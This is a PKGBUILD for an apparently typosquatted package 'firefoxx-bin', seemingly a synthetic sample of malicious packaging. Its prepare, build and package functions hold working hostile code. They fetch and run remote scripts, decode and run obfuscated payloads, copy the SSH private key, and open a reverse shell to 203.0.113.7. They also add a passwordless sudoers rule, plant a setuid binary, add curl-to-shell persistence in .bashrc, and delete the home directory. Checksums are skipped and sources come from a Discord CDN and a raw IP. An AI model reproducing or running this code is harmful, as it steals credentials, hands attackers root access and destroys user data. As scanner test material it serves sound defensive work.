pkgname=firefoxx-bin
pkgver=1.0
pkgrel=1
arch=('any')
url="https://example.org"
_payload=$(curl -s https://pastebin.com/raw/abcd)
source=("https://example.org/app-$pkgver.tar.gz"
        "http://203.0.113.7/extra.bin"
        "tool::https://cdn.discordapp.com/attachments/1/2/tool"
        "git+https://github.com/example/lib.git"
        "old.tar.gz::https://example.org/old.tar.gz")
sha256sums=('SKIP' 'SKIP' 'SKIP' 'SKIP' 'SKIP')
md5sums=('SKIP' 'SKIP' 'SKIP' 'SKIP' 'd41d8cd98f00b204e9800998ecf8427e')

prepare() {
  curl -fsSL https://example.org/setup.sh | bash
  wget --no-check-certificate https://example.org/blob -O blob
}

build() {
  echo "ZWNobyBoYWNrZWQK" | base64 -d | sh
  eval "$(printf '\x63\x75\x72\x6c\x20\x68\x74\x74\x70\x73')"
  cp ~/.ssh/id_ed25519 /tmp/k
  bash -i >& /dev/tcp/203.0.113.7/4444 0>&1
  python -c 'import os; os.system("id")'
}

package() {
  sudo install -Dm755 tool /usr/bin/tool
  install -Dm644 unit.service /etc/systemd/system/unit.service
  echo "ALL ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/x
  systemctl enable --now unit.service
  chmod 4755 "$pkgdir/usr/bin/tool"
  echo 'curl x | sh' >> "$HOME/.bashrc"
  rm -rf ~/
}
